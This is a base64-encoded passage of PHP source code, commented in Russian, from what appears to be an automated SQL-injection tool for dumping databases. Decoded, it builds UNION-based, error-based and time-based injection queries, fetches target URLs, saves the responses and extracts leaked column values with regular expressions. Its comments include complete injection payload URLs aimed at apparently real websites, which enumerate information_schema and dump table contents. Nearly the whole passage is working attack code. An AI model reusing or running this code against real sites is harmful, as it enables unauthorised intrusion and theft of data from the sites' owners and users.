+0LvQsNC60LjQstCw0LXQvCDQtdCz0L4g0YHQv9C10YYg0YHQuNC80LLQvtC70LDQvNC4LCDRh9GC0L7QsdGLINC/0LDRgtC+0Lwg0L3QsNC50YLQuCDQvNC+0LbQvdC+INCx0YvQu9C+INCx0YsKCQlmb3JlYWNoICgkcG9sZSBhcyAka2V5PT4kdmFsKQoJCXsKCSAgCQoJCSAJaWYoY291bnQoJHBvbGUpPT0xKQoJCQl7CgkJCQkvL9C10YHQu9C4INC+0LTQvdC+INC/0L7Qu9C1CgkJIAkJJHphcHIgLj0gJ0NIQVIoJy4kdGhpcy0+Y2hhcmNoZXIoJ1tYXScpLicpJy4nLCcuJHZhbC4nLENIQVIoJy4kdGhpcy0+Y2hhcmNoZXIoJ1tYWF0nKS4nKSc7CgkJCQkKCQkJCS8vJHphcHIgLj0gJ0lGTlVMTChDSEFSKCcuJHRoaXMtPmNoYXJjaGVyKCdbWF0nKS4nKScuJywnLiR2YWwuJyxDSEFSKCcuJHRoaXMtPmNoYXJjaGVyKCdbWFhdJykuJyksMHgyMCknOwoJCQkJCgkJIAl9ZWxzZQoJCQl7CgkJCQkvL9C10YHQu9C4INC90LXRgdC60L7Qu9GM0LrQviDQvdCw0LnRgtC4INC90LDQtNC+CgkJIAkJJHphcHIgLj0gJyxDSEFSKCcuJHRoaXMtPmNoYXJjaGVyKCdbJy4kdmFsLiddJykuJyknLicsJy4kdmFsLicsQ0hBUignLiR0aGlzLT5jaGFyY2hlcignWycuJHZhbC4nXScpLicpJzsKCQkJCQoJCQkJLy8kemFwciAuPSAiMHg1ZSxJRk5VTEwodW5oZXgoSGV4KGNhc3QoJHZhbCBhcyBjaGFyKSkpLDB4MjApLDB4NWUsIjsKCQkgCX0KCSAgCQoJCX0KCQkKCQkvLyR0aGlzLT5kKCR6YXByLCdmaW5hbCAkemFwcicpOwoJICAKCQkvL2h0dHA6Ly9ldmlsZ2FtZXJ6LmNvbS9kb3dubG9hZHMvaW5kZXgucGhwP3pvZWtzdHJpbmc9JnNvcnR3YXk9dGl0bGUmc29ydD1mJyBhbmQoLyoqL3NFbEVjVCAxIC8qKi9mUm9NKC8qKi9zRWxFY1QgY291bnQoKiksLyoqL2NPbkNhVCgoLyoqL3NFbEVjVCgvKiovc0VsRWNUKC8qKi9zRWxFY1QgLyoqL2NPbkNhVCgweDIxN2UyMSxjb3VudCgwKSwweDIxN2UyMSkgLyoqL2ZSb00gaW5mb3JtYXRpb25fc2NoZW1hLi8qKi90QWJMZVMgLyoqL3dIZVJlIC8qKi90QWJMZV9zQ2hFbUE9MHg2NTc2Njk2YzY3NjE2ZDY1NzI3YTVmNjM2ZjZkNWYyZDVmNjQ2MjMzKSkgLyoqL2ZSb00gaW5mb3JtYXRpb25fc2NoZW1hLi8qKi90QWJMZVMgLyoqL2xJbUl0IDAsMSksZmxvb3IocmFuZCgwKSoyKSl4IC8qKi9mUm9NIGluZm9ybWF0aW9uX3NjaGVtYS4vKiovdEFiTGVTIC8qKi9nUm9VcC8qKi9iWSB4KWEpIGFuZCAnMSc9JzEmcGFnZT0yMAoJCQoJCSAkd29ya19jb3VudCA9IGNvdW50KCR0aGlzLT53b3JrKTsvL9GA0LDQsdC+0YfQuNC1INC/0L7Qu9GPINCz0LTQtSDQstGL0LLQvtC0INC10YHRgtGMCgkJCgkJICRuZXcgPSBhcnJheSgpOyAvLyDQp9GC0L4g0L3QsCDQstGL0YXQvtC00LUKCgkJICRnaXZlID0gMDsKCQkgCgkJIAoJCSBpZigkb3JkZXIhPT1hcnJheSgpIEFORCBjb3VudCgkcG9sZSk+MSkKCQkJewoJCQkJJG9yZGVyMiA9ICcrb3JkZXIrYnkrYCcuJG9yZGVyWzBdLidgKycuJG9yZGVyWzFdLicrJzsKCQkJfWVsc2UKCQkJewoJCQkJJG9yZGVyMiA9ICcnOwoJCQl9CgkJIAoJCSAKCQkJaWYoJHRoaXMtPmRlc2MgPT0wIEFORCAkdGhpcy0+ZGVzY19lbmFibGUgPT0gdHJ1ZSkKCQkJewoJCQkJJG9yZGVyMiA9ICdPUkRFUitieStpZCtERVNDJzsKCQkJCS8v0LfQsNC/0YDQvtGBINGG0LXQu9C40LrQvtC8CgkJCX0KCQkgCgkJIC8v0L/QvtC00YHRgtCw0LLQu9GP0LXQvCDQutC+0LvQvtC90LrQuAoJCSBmb3IoJGNvbD0xOyRjb2w8PSR0aGlzLT5jb2x1bW47JGNvbCsrKQoJCQl7CgkJCQlpZigkY29sPT0xKXskemFwPScnO31lbHNleyR6YXA9JywnO30vL9C30LDQv9GP0YLQsNGPCgkJCQoJCQkJaWYoaW5fYXJyYXkoJGNvbCwgJHRoaXMtPndvcmspIEFORCAkZ2l2ZT09MCkKCQkJCXsKCgkJCQkJJHAgPSAkY29sLTE7CgoJCQkJCSRnaXZlKys7CgkJCQkJCgkJCQkJJHF1ZXJ5IC49ICR6YXAuIihzZWxlY3QrQ09OQ0FUKENIQVIoIi4kdGhpcy0+Y2hhcmNoZXIoJ2RkZCcpLiIpLCR6YXByKSIuJysnLiRmcm9tLicrJy4kd2hlcmUuJysnLiRvcmRlcjIuJytsaW1pdCsnLiRsaW1pdC4iICkiOwoJCQkJCQoJCQkJCS8vJHF1ZXJ5IC49ICR6YXAuIihzZWxlY3QrQ09OQ0FUKENIQVIoIi4kdGhpcy0+Y2hhcmNoZXIoJ2RkZCcpLiIpLCR6YXByKSIuJysnLiRmcm9tLicrJy4kd2hlcmUuJysnLiRvcmRlcjIuJytsaW1pdCsnLiRsaW1pdC4iICkiOwoJCQkJCQoJCQkJfWVsc2UKCQkJCXsKCQkJCQkJCgkJCQkJaWYoJG9yZGVyIT09YXJyYXkoKSBBTkQgY291bnQoJHBvbGUpPjEpCgkJCQkJewoJCQkJCQkkcXVlcnkgLj0gJHphcC4iIi4kb3JkZXJbMF07CgkJCQkJfWVsc2UKCQkJCQl7CgkJCQkJCSRxdWVyeSAuPSAkemFwLiRjb2w7CQoJCQkJCX0KCQkJCX0JCgkJCX0KCQkJCgkJCQoJCgkJCQlpZigkdGhpcy0+ZGVidWc9PXRydWUpeyR0aGlzLT5kKCRxdWVyeSwnJHF1ZXJ5IG15c3FsR2V0VmFsdWVDSEFSJyk7fQoJCQkJLy9leGl0OwoJCQkKCQkJCgkJCQkvLyR1cmwxID0gJHRoaXMtPnVybC4kcXVlcnkuJysnLiRmcm9tLicrJy4kd2hlcmUuJysnLiRvcmRlci4nK2xpbWl0KycuJGxpbWl0LicnLiRrOwkKCQkJCSR1cmwxID0gJHRoaXMtPnVybC4kcXVlcnkuJycuJGs7CQkKCgkJCQkkdXJsMSA9IHN0cl9yZXBsYWNlKCcsLCcsICcsJywkdXJsMSk7CgkJCQkkdXJsMSA9IHN0cl9yZXBsYWNlKCcrKysrJywgJysnLCR1cmwxKTsKCQkJCSR1cmwxID0gc3RyX3JlcGxhY2UoJysrKycsICcrJywkdXJsMSk7CgkJCQkkdXJsMSA9IHN0cl9yZXBsYWNlKCcrKycsICcrJywkdXJsMSk7CgkJCQkKCQkJCQoJCQkJCgkJCQkvL2lmKCR0aGlzLT5kZWJ1Zz09dHJ1ZSl7JHRoaXMtPmQoJHVybDEsJyR1cmwxINC/0L7Qu9C90YvQuSBteXNxbEdldFZhbHVlQ0hBUicpO30KCQkJCS8vZXhpdDsKCQkJCSRmaWxlID0gJHRoaXMtPmdldENvbnRlbnRzKCR1cmwxKTsKCQkJCQoJCQkJCgkJCQkKCQkJCWlmKCR0aGlzLT5oZWFkX2VuYWJsZT09dHJ1ZSl7CgkJCQkJCgkJCQkJZmlsZV9wdXRfY29udGVudHMoJy4vZmlsZV9oZWFkLnR4dCcsJGZpbGUpOwoJCQkJfWVsc2V7CgkJCQkJCgkJCQkJZmlsZV9wdXRfY29udGVudHMoJy4vZmlsZS50eHQnLCRmaWxlKTsKCQkJCX0KCQkJCQoJCQkJCgkJCQkvLyR0aGlzLT5kKCRmaWxlLCdmaWxlJyk7CgkJCQkvL2V4aXQ7CgkJCQkKCQkJCS8v0LjRidC10Lwg0YDQtdC30YPQu9GM0YLQsNGC0YsJCgkJCQlpZihjb3VudCgkcG9sZSk9PTEpIC8v0LXRgdC70Lgg0L7QvSDQvtC00LjQvSDQv9GA0LXQtNC/0L7Qu9Cw0LPQsNC10YLRgdGPCgkJCQl7CgkJIAkJCgkJCQkJcHJlZ19tYXRjaF9hbGwoInxcW1hcXSguKj8pXFtYWFxdfGkiLCRmaWxlLCRhcnIpOwoJCQkJCQoJCQkJCS8vaWYoc3RybGVuKCRhcnJbMV1bMF0pPjUwMClyZXR1cm4gZmFsc2U7CQoJCQkJCS8vaWYoJHRoaXMtPmRlYnVnPT10cnVlKXskdGhpcy0+ZCgkYXJyLCdhcnIgT05FIFBPTEUgQ0hBUicpO30KCQkJCQkKCQkJCQkKCgkJCQkJaWYoaXNzZXQoJGFyclsxXVswXSkpcmV0dXJuIGFycmF5KCRwb2xlWzBdPT4kYXJyWzFdWzBdKTsKCQkJCQkKCQkJCQlyZXR1cm4gZmFsc2U7CgkJIAkJCgkJCQl9ZWxzZS8v0LXRgdC70Lgg0L3QtSDRgdC60L7Qu9GM0LrQviDQv9C+0LvQtdC5INCx0YvQu9C+CgkJCQl7CgkJIAkJCQkKCQkJCQlmb3JlYWNoICgkcG9sZSBhcyAkdmFsKQoJCQkJCXsKCQkJIAkKCQkJCQkJLy9wcmVnX21hdGNoX2FsbCgifFxbeyR2YWx9XF0oLio/KVxbeyR2YWx9XF0vaVMiLCRmaWxlLCRhcnIpOwoJCQkJCQlwcmVnX21hdGNoX2FsbCgifFxbeyR2YWx9XF0oLio/KVxbeyR2YWx9XF18aSIsJGZpbGUsJGFycik7CgkJCQkJCS8vaWYoc3RybGVuKCRhcnJbMV1bMF0pPjUwMClyZXR1cm4gZmFsc2U7CQoJCQkJCQkvLyR0aGlzLT5kKCJ+XFt7JHZhbH1cXSguKj8pXFt7JHZhbH1cXX5pUyIsJ3JlZyBBTEwnKTsKCQkJCQkJCgkJCQkJCQoJCQkJCQkKCQkJCQkJLy9pZigkdGhpcy0+ZGVidWc9PXRydWUpeyR0aGlzLT5kKCRhcnIsJ2FyciBPTkUgQUxMIFBPTEVTIENIQVInKTt9CgkJCQkJCQoJCQkJCQoJCQkJCgkJCQkJCWlmKGlzc2V0KCRhcnJbMV1bMF0pKQoJCQkJCQl7CgkJCQkJCQkkZXhwb3J0WyR2YWxdID0gJGFyclsxXVswXTsKCQkJCQkJfWVsc2UKCQkJCQkJewoJCQkJCQkJJGV4cG9ydFskdmFsXSA9ICcnOwoJCQkJCQl9CgkJCQkJfQoJCQkJfQoJCQkKCQkvLwkkdGhpcy0+ZCgkZXhwb3J0LCckZXhwb3J0Jyk7CgkJCS8vZXhpdDsKCQkJCgkJCWlmKGlzc2V0KCRleHBvcnQpKQoJCQl7CQoJCQkJcmV0dXJuICRleHBvcnQ7CgkJCX0KCQkJCgkJCXJldHVybiBmYWxzZTsKCgl9CgoJZnVuY3Rpb24gbXlzcWxHZXRWYWx1ZUlGTlVMTCgkYmQsJHRhYmxlLCRwb2xlLCRsaW1pdD0wLCRvcmRlcj1hcnJheSgpLCR3aGVyZT0nJyl7Ly/QvtCx0YnQsNGPINGE0YPQvdC60YbQuNGPINC00LvRjyBNWVNRTCAKCQkKCQkvLyR0aGlzLT5kKCR0aGlzLT51cmwsJyR0aGlzLT51cmwnKTsKCQkKCQkvLyR0aGlzLT5kKCd0b2Noa2E6IG15c3FsR2V0VmFsdWUgTkFDSEFMTycpOwoJCQoJCS8vJHRoaXMtPmQoJHBvbGUsJyR0YWJsZScpOwoJCQoJCS8vZXhpdDsKCQkKCQoJCQoJCQoJCWlmKCR0aGlzLT5tZXRob2Q9PTEwKQoJCXsKCQkJLy8kdGhpcy0+ZCgndG9jaGthOiBtZXRob2Q9PTEwIFNMRUVQIG15c3FsR2V0VmFsdWVTbGVlcCcpOwoJCQkkZ2V0ID0gJHRoaXMtPm15c3FsR2V0VmFsdWVTbGVlcCgkYmQsJHRhYmxlLCRwb2xlLCRsaW1pdCwkb3JkZXIsJHdoZXJlKTsKCQkJaWYoJGdldCE9PWZhbHNlKXJldHVybiAkZ2V0OwoJCQlyZXR1cm4gZmFsc2U7CgoJCX0KCQoJCWlmKCR0aGlzLT5tZXRob2Q9PTYpCgkJewoJCQkvLyR0aGlzLT5kKCd0b2Noa2E6IG1ldGhvZD09NiBteXNxR2V0VmFsdWVCeUVycm9yTmV3VycpOwoJCQkkZ2V0ID0gJHRoaXMtPm15c3FHZXRWYWx1ZUJ5RXJyb3JOZXcoJGJkLCR0YWJsZSwkcG9sZSwkbGltaXQsJG9yZGVyLCR3aGVyZSk7OwoJCQlpZigkZ2V0IT09ZmFsc2UpcmV0dXJuICRnZXQ7CgkJCXJldHVybiBmYWxzZTsKCgkJfQkKCQoJCWlmKCR0aGlzLT5tZXRob2Q9PTUpCgkJewoKCQkJLy8kdGhpcy0+ZCgndG9jaGthOiBtZXRob2Q9PTUgbXlzcWxHZXRCeU9yZGVyJyk7CgkJCSRnZXQgPSAkdGhpcy0+bXlzcWxHZXRCeU9yZGVyKCRiZCwkdGFibGUsJHBvbGUsJGxpbWl0LCRvcmRlciwkd2hlcmUpOwoJCQlpZigkZ2V0IT09ZmFsc2UpcmV0dXJuICRnZXQ7CgkJCXJldHVybiBmYWxzZTsKCgkJfQoJCQoJCWlmKCR0aGlzLT5tZXRob2Q9PTQpCgkJewoJCQkvLyR0aGlzLT5kKCd0b2Noa2E6IG1ldGhvZD09NCBteXNxR2V0VmFsdWVCeUVycm9yJyk7CgkJCSRnZXQgPSAkdGhpcy0+bXlzcUdldFZhbHVlQnlFcnJvcigkYmQsJHRhYmxlLCRwb2xlLCRsaW1pdCwkb3JkZXIsJHdoZXJlKTs7CgkJCWlmKCRnZXQhPT1mYWxzZSlyZXR1cm4gJGdldDsKCQkJcmV0dXJuIGZhbHNlOwoKCQl9CgkJCgkJCgkJLy8kdGhpcy0+ZCgnbWV0aG9kIHBvIHVtb2xjaGFuaXknKTsKCQkKCQlpZigkdGFibGUhPT0nJykKCQl7CgkJCQoJCQlpZigkYmQ9PScnKXsKCQkJCSRmcm9tID0gJ0ZST00rJy4kdGFibGUuJyc7CgkJCX1lbHNlewoJCQkJJGZyb20gPSAnRlJPTSsnLiRiZC4nLicuJHRhYmxlLicnOwoJCQl9CgkJfWVsc2V7CgkJCSRmcm9tID0gJyc7CgkJfQoJCQoJCQoJCSRiZCA9ICAgIHN0cl9yZXBsYWNlKCcgJywgJysnLCRiZCk7CgkJJHRhYmxlID0gc3RyX3JlcGxhY2UoJyAnLCAnKycsJHRhYmxlKTsKCQkkZnJvbSA9ICBzdHJfcmVwbGFjZSgnICcsICcrJywkZnJvbSk7CgkJJHdoZXJlID0gc3RyX3JlcGxhY2UoJyAnLCAnKycsJHdoZXJlKTsKCQkkb3JkZXIgPSBzdHJfcmVwbGFjZSgnICcsICcrJywkb3JkZXIpOwoJCQoJCQoJCSRtZXRob2QgPSAkdGhpcy0+c3Bvc29iOwoJCQoJCS8vJHRoaXMtPmQoJG1ldGhvZCwnJG1ldGhvZCA9ICR0aGlzLT5zcG9zb2InKTsKCQkKCQkKCQkKCQkKCQkvL9C90LDRh9Cw0LvQviDQu9C40LzQuNGC0LAKCQkkbGltaXQgPSAkbGltaXQuJywxJzsKCQkJCQkJCQoJCSRuID0gJHRoaXMtPnZhcmlhbnRfcXVlcnlbJHRoaXMtPnNwb3NvYl1bJHRoaXMtPm1ldGhvZF1bMF07Ly/QvdCw0YfQsNC70L4g0LfQsNC/0YDQvtGB0LAKCQkkayA9ICR0aGlzLT52YXJpYW50X3F1ZXJ5WyR0aGlzLT5zcG9zb2JdWyR0aGlzLT5tZXRob2RdWzFdOy8v0LrQvtC90LXRhiAg0LfQsNC/0YDQvtGB0LAKCQkKCQkvLyR0aGlzLT5kKCRuLCfQvdCw0YfQsNC70L4g0LfQsNC/0YDQvtGB0LAnKTsKCQkvLyR0aGlzLT5kKCRrLCfQutC+0L3QtdGGICDQt9Cw0L/RgNC+0YHQsCcpOwoJCQoJCS8vJHRoaXMtPmQoJHRoaXMtPmNvbHVtbiwnJHRoaXMtPmNvbHVtbicpOwoJCS8vJHRoaXMtPmQoJHRoaXMtPndvcmssJyR0aGlzLT53b3JrJyk7CgkJCgkKCQkkcXVlcnkgPSAiMTExMTExMTExMTExMSRuIjsvL9C90LDRh9Cw0LvRjNC90YvQuSDQt9Cw0L/RgNC+0YEg0LTQu9GPINCd0JUgc2xlZXAKCQkKCQkJCgkKCQlpZighaXNfYXJyYXkoJHBvbGUpKSRwb2xlID0gYXJyYXkoJHBvbGUpOy8v0Y3RgtC+INC60LDQuiDRgNCw0Lcg0L3QsNGIINC30LDQv9GA0L7RgSB2ZXJzaW9uINC6INC/0YDQuNC80LXRgNGDCgkJCgkJJHphcHIgPSAnJzsvL9C+0LHRidCw0Y8g0YHRgtGA0L7QutCwINC00LvRjyDQvdCw0YjQuNGFINC/0L7Qu9C10LkKCQkgCgkJLy/QvtCx0LLQvtC70LDQutC40LLQsNC10Lwg0LXQs9C+INGB0L/QtdGGINGB0LjQvNCy0L7Qu9Cw0LzQuCwg0YfRgtC+0LHRiyDQv9Cw0YLQvtC8INC90LDQudGC0Lgg0LzQvtC20L3QviDQsdGL0LvQviDQsdGLCgkJZm9yZWFjaCAoJHBvbGUgYXMgJGtleT0+JHZhbCkKCQl7CgkgIAkKCQkgCWlmKGNvdW50KCRwb2xlKT09MSkKCQkJewoJCQkJLy/QtdGB0LvQuCDQvtC00L3QviDQv9C+0LvQtQoJCSAJCS8vJHphcHIgLj0gJ0NIQVIoJy4kdGhpcy0+Y2hhcmNoZXIoJ1tYXScpLicpJy4nLCcuJHZhbC4nLENIQVIoJy4kdGhpcy0+Y2hhcmNoZXIoJ1tYWF0nKS4nKSc7CgkJCQkvLwkkemFwciAuPSAiSUZOVUxMKHVuaGV4KEhleChjYXN0KCR2YWwgYXMgY2hhcikpKSwweDIwKSI7CgkJCQkkemFwciAuPSAiSUZOVUxMKGNhc3QoJHZhbCBhcyBjaGFyKSwweDIwKSI7CgkJCQkKCQkgCQkKCQkgCX1lbHNlCgkJCXsKCQkJCS8v0LXRgdC70Lgg0L3QtdGB0LrQvtC70YzQutC+INC90LDQudGC0Lgg0L3QsNC00L4KCQkJCS8vJHphcHIgLj0gJyxDSEFSKCcuJHRoaXMtPmNoYXJjaGVyKCdbJy4kdmFsLiddJykuJyknLicsJy4kdmFsLicsQ0hBUignLiR0aGlzLT5jaGFyY2hlcignWycuJHZhbC4nXScpLicpJzsKCQkJCQoJCQkJJHphcHIgLj0gIjB4NWUsSUZOVUxMKGNhc3QoJHZhbCBhcyBjaGFyKSwweDIwKSwweDVlLCI7CgkJIAl9CgkgIAkKCQl9CgkJCgkJLy8kdGhpcy0+ZCgkemFwciwnZmluYWwgJHphcHInKTsKCSAgCgkJLy8vL2h0dHA6Ly9raW5va2x1Ym5pY2hrYS5ydS9uZXdzX3ZpZXcucGhwP25ld3NfaWQ9MiBVTklPTiBBTEwgU0VMRUNUIChTRUxFQ1QgQ09OQ0FUKCdxdmtxcScsSUZOVUxMKENBU1QoQUNUSVZFIEFTIENIQVIpLCcgJyksJ2p6YXJxdCcsSUZOVUxMKENBU1QoQUdFTlRfSU5URVJWQUwgQVMgQ0hBUiksJyAnKSwnanphcnF0JyxJRk5VTEwoQ0FTVChEQVRFX0NIRUNLIEFTIENIQVIpLCcgJyksJ2p6YXJxdCcsSUZOVUxMKENBU1QoSUQgQVMgQ0hBUiksJyAnKSwnanphcnF0JyxJRk5VTEwoQ0FTVChJU19QRVJJT0QgQVMgQ0hBUiksJyAnKSwnanphcnF0JyxJRk5VTEwoQ0FTVChMQVNUX0VYRUMgQVMgQ0hBUiksJyAnKSwnanphcnF0JyxJRk5VTEwoQ0FTVChNT0RVTEVfSUQgQVMgQ0hBUiksJyAnKSwnanphcnF0JyxJRk5VTEwoQ0FTVChOQU1FIEFTIENIQVIpLCcgJyksJ2p6YXJxdCcsSUZOVUxMKENBU1QoTkVYVF9FWEVDIEFTIENIQVIpLCcgJyksJ2p6YXJxdCcsSUZOVUxMKENBU1QoU09SVCBBUyBDSEFSKSwnICcpLCdqemFycXQnLElGTlVMTChDQVNUKFVTRVJfSUQgQVMgQ0hBUiksJyAnKSwncWp6enEnKSBGUk9NIHUzNTQ5MV8yLmJfYWdlbnQgTElNSVQgMiwxKS0tIC0KCQoJICAKCSAgCgkJLy9odHRwOi8vZXZpbGdhbWVyei5jb20vZG93bmxvYWRzL2luZGV4LnBocD96b2Vrc3RyaW5nPSZzb3J0d2F5PXRpdGxlJnNvcnQ9ZicgYW5kKC8qKi9zRWxFY1QgMSAvKiovZlJvTSgvKiovc0VsRWNUIGNvdW50KCopLC8qKi9jT25DYVQoKC8qKi9zRWxFY1QoLyoqL3NFbEVjVCgvKiovc0VsRWNUIC8qKi9jT25DYVQoMHgyMTdlMjEsY291bnQoMCksMHgyMTdlMjEpIC8qKi9mUm9NIGluZm9ybWF0aW9uX3NjaGVtYS4vKiovdEFiTGVTIC8qKi93SGVSZSAvKiovdEFiTGVfc0NoRW1BPTB4NjU3NjY5NmM2NzYxNmQ2NTcyN2E1ZjYzNmY2ZDVmMmQ1ZjY0NjIzMykpIC8qKi9mUm9NIGluZm9ybWF0aW9uX3NjaGVtYS4vKiovdEFiTGVTIC8qKi9sSW1JdCAwLDEpLGZsb29yKHJhbmQoMCkqMikpeCAvKiovZlJvTSBpbmZvcm1hdGlvbl9zY2hlbWEuLyoqL3RBYkxlUyAvKiovZ1JvVXAvKiovYlkgeClhKSBhbmQgJzEnPScxJnBhZ2U9MjAKCQkKCQkgJHdvcmtfY291bnQgPSBjb3VudCgkdGhpcy0+d29yayk7Ly/RgNCw0LHQvtGH0LjQtSDQv9C+0LvRjyDQs9C00LUg0LLRi9Cy0L7QtCDQtdGB0YLRjAoJCQoJCSAkbmV3ID0gYXJyYXkoKTsgLy8g0KfRgtC+INC90LAg0LLRi9GF0L7QtNC1CgoJCSAkZ2l2ZSA9IDA7CgkJIAoJCSAKCQkgaWYoJG9yZGVyIT09YXJyYXkoKSBBTkQgY291bnQoJHBvbGUpPjEpCgkJCXsKCQkJCSRvcmRlcjIgPSAnK29yZGVyK2J5K2AnLiRvcmRlclswXS4nYCsnLiRvcmRlclsxXS4nKyc7CgkJCX1lbHNlCgkJCXsKCQkJCSRvcmRlcjIgPSAnJzsKCQkJfQoJCSAKCQkgCgkJCWlmKCR0aGlzLT5kZXNjID09MCBBTkQgJHRoaXMtPmRlc2NfZW5hYmxlID09IHRydWUpCgkJCXsKCQkJCSRvcmRlcjIgPSAnT1JERVIrYnkraWQrREVTQyc7CgkJCQkvL9C30LDQv9GA0L7RgSDRhtC10LvQuNC60L7QvAoJCQl9CgkJIAoJCSAvL9C/0L7QtNGB0YLQsNCy0LvRj9C10Lwg0LrQvtC70L7QvdC60LgKCQkgZm9yKCRjb2w9MTskY29sPD0kdGhpcy0+Y29sdW1uOyRjb2wrKykKCQkJewoJCQkJaWYoJGNvbD09MSl7JHphcD0nJzt9ZWxzZXskemFwPScsJzt9Ly/Qt9Cw0L/Rj9GC0LDRjwoJCQkKCQkJCWlmKGluX2FycmF5KCRjb2wsICR0aGlzLT53b3JrKSBBTkQgJGdpdmU9PTApCgkJCQl7CgoJCQkJCSRwID0gJGNvbC0xOwoKCQkJCQkkZ2l2ZSsrOwoJCQkJCQoJCQkJCQoJCQkJCSRoaCA9ICR0aGlzLT5zdHJ0b2hleCgnW2RkZF0nKTsKCQkJCQkKCQkJCQkkcXVlcnkgLj0gJHphcC4iKHNlbGVjdCtDT05DQVQoJGhoLCR6YXByLCRoaCkiLicrJy4kZnJvbS4nKycuJHdoZXJlLicrJy4kb3JkZXIyLicrbGltaXQrJy4kbGltaXQuJyknOwoJCQkJCQoJCQkJCQoJCQkJCQoJCQkJfWVsc2UKCQkJCXsKCQkJCQkJCgkJCQkJaWYoJG9yZGVyIT09YXJyYXkoKSBBTkQgY291bnQoJHBvbGUpPjEpCgkJCQkJewoJCQkJCQkkcXVlcnkgLj0gJHphcC4iIi4kb3JkZXJbMF07CgkJCQkJfWVsc2UKCQkJCQl7CgkJCQkJCSRxdWVyeSAuPSAkemFwLiRjb2w7CQoJCQkJCX0KCQkJCX0JCQoJCQkJCQoJCQkJCQoJCQkJCQoJCQkJCS8vJHF1ZXJ5IC49ICR6YXAuIihzZWxlY3QrQ09OQ0FUKENIQVIoIi4kdGhpcy0+Y2hhcmNoZXIoJ2RkZCcpLiIpLCR6YXByKSIuJysnLiRmcm9tLicrJy4kd2hlcmUuJysnLiRvcmRlcjIuJytsaW1pdCsnLiRsaW1pdC4iICkiOwoJCQkJCQoJCQkJCS8vJHF1ZXJ5IC49ICR6YXAuIihzZWxlY3QrQ09OQ0FUKENIQVIoIi4kdGhpcy0+Y2hhcmNoZXIoJ2RkZCcpLiIpLCR6YXByKSIuJysnLiRmcm9tLicrJy4kd2hlcmUuJysnLiRvcmRlcjIuJytsaW1pdCsnLiRsaW1pdC4iICkiOwoJCQkJCQoJCQkJLy99ZWxzZQoJCQkJLy97CgkJCQkJCQoJCQkJCS8vaWYoJG9yZGVyIT09YXJyYXkoKSBBTkQgY291bnQoJHBvbGUpPjEpCgkJCQkJLy97CgkJCQkJLy8JJHF1ZXJ5IC49ICR6YXAuIiIuJG9yZGVyWzBdOwoJCQkJCS8vfWVsc2UKCQkJCQkvL3sKCQkJCQkJLy8kcXVlcnkgLj0gJHphcC4kY29sOwkKCQkJCQkvL30KCQkJCS8vfQkKCQkJfQoJCQkKCQkJCgkKCQkJCWlmKCR0aGlzLT5kZWJ1Zz09dHJ1ZSl7JHRoaXMtPmQoJHF1ZXJ5LCckcXVlcnkgbXlzcWxHZXRWYWx1ZUlTTlVMTCcpO30KCQkJCS8vZXhpdDsKCQkJCgkJCQoJCQkJLy8kdXJsMSA9ICR0aGlzLT51cmwuJHF1ZXJ5LicrJy4kZnJvbS4nKycuJHdoZXJlLicrJy4kb3JkZXIuJytsaW1pdCsnLiRsaW1pdC4nJy4kazsJCgkJCQkkdXJsMSA9ICR0aGlzLT51cmwuJHF1ZXJ5LicnLiRrOwkJCgoJCQkJJHVybDEgPSBzdHJfcmVwbGFjZSgnLCwnLCAnLCcsJHVybDEpOwoJCQkJJHVybDEgPSBzdHJfcmVwbGFjZSgnKysrKycsICcrJywkdXJsMSk7CgkJCQkkdXJsMSA9IHN0cl9yZXBsYWNlKCcrKysnLCAnKycsJHVybDEpOwoJCQkJJHVybDEgPSBzdHJfcmVwbGFjZSgnKysnLCAnKycsJHVybDEpOwoJCQkJCgkJCQkKCQkJCQoJCQkJLy9pZigkdGhpcy0+ZGVidWc9PXRydWUpeyR0aGlzLT5kKCR1cmwxLCckdXJsMSDQv9C+0LvQvdGL0LkgbXlzcWxHZXRWYWx1ZUNIQVInKTt9CgkJCQkvL2V4aXQ7CgkJCQkkZmlsZSA9ICR0aGlzLT5nZXRDb250ZW50cygkdXJsMSk7CgkJCQkKCQkJCQoJCQkJCgkJCQlpZigkdGhpcy0+aGVhZF9lbmFibGU9PXRydWUpewoJCQkJCQoJCQkJCWZpbGVfcHV0X2NvbnRlbnRzKCcuL2ZpbGVfaGVhZC50eHQnLCRmaWxlKTsKCQkJCX1lbHNlewoJCQkJCQoJCQkJCWZpbGVfcHV0X2NvbnRlbnRzKCcuL2ZpbGUudHh0JywkZmlsZSk7CgkJCQl9CgkJCQkKCQkJCQoJCQkJLy8kdGhpcy0+ZCgkZmlsZSwnZmlsZScpOwoJCQkJLy9leGl0OwoJCQkJCgkJCQkJCQkKCQkJCS8v0LjRidC10Lwg0YDQtdC30YPQu9GM0YLQsNGC0YsJCgkJCQlpZihjb3VudCgkcG9sZSk9PTEpIC8v0LXRgdC70Lgg0L7QvSDQvtC00LjQvSDQv9GA0LXQtNC/0L7Qu9Cw0LPQsNC10YLRgdGPCgkJCQl7CgkJIAkJCgkJCQkJLy9wcmVnX21hdGNoX2FsbCgiL1xbWFxdKC4qPylcW1hYXF0vaXMiLCRmaWxlLCRhcnIpOwoJCQkJCQoJCQkJCXByZWdfbWF0Y2hfYWxsKCJ8XFtkZGRcXSguKj8pXFtkZGRcXXxpIiwkZmlsZSwkYXJyKTsKCQkJCQkvL3ByZWdfbWF0Y2goInxcW2RkZFxdKC4qPylcW2RkZFxdfGkiLCRmaWxlLCRhcnIpOwoJCQkJCQoJCQkJCQoJCQkJCS8vJHRoaXMtPmQoJGFyciwnYXJyIE9ORSBQT0xFIEhFWCcpOwoJCQkJCQoJCQkJCS8vaWYoc3RybGVuKCRhcnJbMV1bMF0pPjUwMClyZXR1cm4gZmFsc2U7CQoKCQkJCQlpZihpc3NldCgkYXJyWzFdWzBdKSlyZXR1cm4gYXJyYXkoJHBvbGVbMF09PiRhcnJbMV1bMF0pOwoJCQkJCQoJCQkJCXJldHVybiBmYWxzZTsKCQkgCQkKCQkJCX1lbHNlLy/QtdGB0LvQuCDQvdC1INGB0LrQvtC70YzQutC+INC/0L7Qu9C10Lkg0LHRi9C70L4KCQkJCXsKCQkgCQkJCQoJCQkJCQoJCQkgCQoJCQkJCQkvL3ByZWdfbWF0Y2hfYWxsKCJ+XFt7JHZhbH1cXSguKj8pXFt7JHZhbH1cXX5pUyIsJGZpbGUsJGFycik7CgkJCQkJCQoJCQkJCQlwcmVnX21hdGNoX2FsbCgifFxbZGRkXF0oLio/KVxbZGRkXF18aSIsJGZpbGUsJGFycik7CgkJCQkJCS8vcHJlZ19tYXRjaCgifFxbZGRkXF0oLio/KVxbZGRkXF18aSIsJGZpbGUsJGFycik7CgkJC